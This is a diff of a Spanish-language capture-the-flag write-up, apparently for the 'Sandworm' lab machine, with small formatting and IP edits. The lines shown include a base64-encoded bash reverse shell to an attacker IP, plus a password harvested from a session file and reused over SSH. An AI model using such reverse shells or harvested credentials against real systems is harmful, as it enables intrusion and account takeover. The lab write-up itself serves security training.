@@ -177,7 +177,7 @@ Vemos que si funcionó y que somos el usuario `atlas`
 Es dificil leer y ejecutar comandos largos o que tengan muchos caracteres especiales, por lo que lo mejor es encodear en `base64` el payload y probar los más cortos. Tratar de leer la `id_rsa` no será posible.
 
 ```bash
-echo "bash -i >& /dev/tcp/10.10.14.176/443 0>&1" -n | base64
+$ echo "bash -i >& /dev/tcp/10.10.14.176/443 0>&1" -n | base64
 YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNzYvNDQzIDA+JjEgLW4K
 ```
 
@@ -263,7 +263,7 @@ cat .config/httpie/sessions/localhost_5000/admin.json
 Un usuario y contraseña `silentobserver:quietLiketheWind22`, podemos probar conectarnos como `atlas`, pero no funcionará, podemos probar tal cual nos la proporcionan.
 
 ```bash
-$ sshpass -p "quietLiketheWind22" ssh silentobserver@10.10.11.214
+$ sshpass -p "quietLiketheWind22" ssh silentobserver@10.10.11.218
 #####
 silentobserver@sandworm:~$ ls
 user.txt
